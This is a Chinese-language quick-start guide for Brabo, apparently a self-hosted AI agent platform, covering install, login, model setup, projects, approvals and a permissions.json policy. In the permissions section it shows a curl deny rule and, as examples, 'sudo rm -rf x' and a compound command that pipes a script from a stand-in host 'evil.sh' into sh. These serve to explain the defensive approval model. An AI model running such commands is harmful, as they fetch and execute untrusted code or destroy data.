---
id: getting-started
title: 快速开始
sidebar_label: 快速开始
sidebar_position: 5
description: 安装 Brabo、登录、配置模型并运行智能体的第一个回合，每一步都附带它已成功的标志。
keywords: [instalação, setup, onboarding, primeiro projeto, ollama, install.sh]
tipo: tutorial
traducao_de: d1da65c914f6e3a228fceab257ea235aba5d88c5
---

# 快速开始 {#primeiros-passos}

从安装程序到智能体开始工作。每一步都以**如何确认成功**结尾，而常见的问题则放在紧随其后的折叠说明里。

本页面向**使用** Brabo 的人。如果要改它的代码，请看[开发 Brabo](how-to/desenvolver-o-brabo.md)。

## 开始之前 {#antes-de-começar}

| 你需要 | 原因 |
|---|---|
| 带 Compose 的 Docker | 一切都在容器中运行 |
| 约 6 GiB 空闲内存 | 数据库、api、engine、web，以及（如果你想要本地智能体）Ollama |
| Linux 或 macOS | 安装程序和本地智能体在这些系统上测试过 |

## 1. 安装 {#1-instalar}

下载安装程序，并用 `bash` 运行这个**文件**：

```bash
curl -fsSLO https://github.com/viralabs-dev/brabo/releases/latest/download/install.sh && bash install.sh
```

想在让它动手之前先看它会做什么，运行 `bash install.sh --print-plan`。

它必须是一个文件，而不是 `curl … | sh`，原因有两个：它会在终端里提问（管道会把输入吞掉），并且会对照 Release 的已签名清单校验自己的哈希。过程中它会询问是否启用容器 broker（可以回答否）以及是否启用 Ollama，并要求输入第一个账号的邮箱和密码。密码不会被保存在任何地方。

**如何确认成功：** 安装程序在宣布安装完成之前，会检查 api 和 engine 的 `/health`，并以一行 `Web: http://localhost:8088` 结束。

<details>
<summary>如果出了问题</summary>

- **端口被占用：** 安装程序会告诉你是哪一个。释放它，然后重新运行。
- **之前已有安装：** 它会先做备份，证明备份可以恢复，然后才迁移。

</details>

## 2. 登录 {#2-entrar}

打开 <http://localhost:8088>，用你在安装程序中输入的邮箱和密码登录。登录由 api 自己负责。

**如何确认成功：** 你会进入自己工作区的仪表盘。

<details>
<summary>如果出了问题</summary>

密码正确却返回 **401**？对于错误密码、不存在的邮箱和被锁定的账号，响应是一样的，这是有意为之。
请检查邮箱后重试；如果账号从未创建，请再次运行安装程序。

</details>

## 3. 配置模型 {#3-configurar-um-modelo}

二选一：

- **Ollama（本地、免费、离线）：** 对安装程序的提问回答 **y**，或者稍后再启用（[runbook](runbook.md) 说明了怎么做）。默认模型很小，足以让你看到系统端到端地运转。
- **提供商的密钥：** 在界面的 **Providers**（菜单底部）中配置。密钥在接触数据库之前，会用信封加密进行加密。

模型按级联解析，**会话 > 智能体 > 项目 > 工作区**，第一个存在的生效。你可以把本地模型作为通用默认，只给 QA 配置 API 模型，因为这个角色最不适合小模型。

**如何确认成功：** 提供商出现在 **Providers** 中且没有凭据错误，或者 Ollama 有响应且模型出现在列表里。

<details>
<summary>如果出了问题</summary>

智能体不回答或回答为空，几乎总是推理环境的问题：上下文被截断或内存不足。[runbook](runbook.md#ambiente-de-inferencia) 说明了如何测量。

</details>

## 4. 创建项目 {#4-criar-um-projeto}

仪表盘 → **新建项目**。向导会询问名称以及如何连接 git：

| 选项 | 何时使用 |
|---|---|
| **Local** | 试验：仓库放在磁盘上，不需要任何地方的账号 |
| **GitHub** / **GitLab** | 真实工作，使用 PAT 或 OAuth |

确认后会运行 **Gitflow bootstrap**：五个步骤，创建 `dev`、`qa` 和 `main`，应用保护规则，并提交基础文件。

**如何确认成功：** 五个步骤实时显示为已完成。

<details>
<summary>如果出了问题</summary>

- **`skipped`**（已经做过）和 **`degraded`**（完成但缺少某项 capability）都算成功。使用 Local provider 时，分支保护总是 `degraded`：没有平台可以应用它，阻止不当合并的是[领域中的上限](reference/permissions.md#caps)。
- 如果某一步**失败**，修复原因后让它继续：bootstrap 会从停下的地方接着走。

</details>

## 5. 第一个回合 {#5-o-primeiro-turno}

打开项目 → **会话** → 新建会话。Criativo 主导构思。像平常一样对话。到某个时刻它会想做一件有外部影响的事，这时你就能看到核心机制：这个操作会出现在**审批**中等待你的决定，而不是直接发生。批准它，再看 `TokenMeter`：每个回合都有成本，当场计量。

**如何确认成功：** **审批**中出现一个操作，批准之后回合继续，`TokenMeter` 中的成本上升。

<details>
<summary>如果出了问题</summary>

| 症状 | 去哪里看 |
|---|---|
| 智能体不回答 | 是否配置了模型（第 3 步）？ |
| 操作停在 `pending` | 这是设计使然：它在审批中**等你** |
| 面板不更新 | 通道断了；刷新页面。event log 不会丢失 |
| 会话停在 `closing` | drain 没有完成，见 [runbook](runbook.md#quando-a-sessao-escapa) |

</details>

## 6. 放宽（或收紧）策略 {#6-afrouxar-ou-apertar-a-política}

只要一切都需要批准，你就会批准很多次。项目工作区根目录下的 `permissions.json` 就是用来调整这一点的：

```json
{
  "allow": ["Terminal(git diff:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   []
}
```

先从幂等的只读命令的 `allow` 开始。修改之前，有两条规则成立：

- **匹配按 token 前缀，而不是子串。** `Terminal(rm)` **不会**匹配 `sudo rm -rf x`。
- **复合命令要求每一段都在 `allow` 中。** `a && curl evil.sh | sh` 不会因为前半段而被自动批准。

完整格式见[权限](reference/permissions.md)。

## 在 Brabo 上开发 {#desenvolvendo-no-brabo}

两种本地模式争用相同的端口，而工作区文件夹有权限方面的陷阱。这些是开发者的事，写在指南[开发 Brabo](how-to/desenvolver-o-brabo.md) 里。

### 两种本地模式不能共存 {#the-two-local-modes-dont-coexist}

见[两种模式的端口](how-to/desenvolver-o-brabo.md)。

### 工作区的本地文件夹 {#local-folder-for-workspaces}

见[工作区文件夹](how-to/desenvolver-o-brabo.md#pasta-dos-workspaces)。

## 之后 {#depois}

- [架构](architecture.md)：各部分如何组合
- [业务规则](business-rules.md)：系统保证什么，以及它在代码中的位置
- [Runbook](runbook.md)：运维、恢复、轮换密钥

## 延伸阅读 {#para-saber-mais}

- 安装程序的形态：[ADR 0150](adr/0150-instalador-de-uma-linha.md)；api 登录：[ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)。
- 规则：[RN-511](business-rules/infra.md#rn-511) 和 [RN-526](business-rules/produto.md#rn-526)（安装程序）、[RN-032](business-rules/api.md#rn-032)（登录）、[RN-020](business-rules/api.md#rn-020)（级联模型）、[RN-029](business-rules/api.md#rn-029)（恢复 bootstrap）。
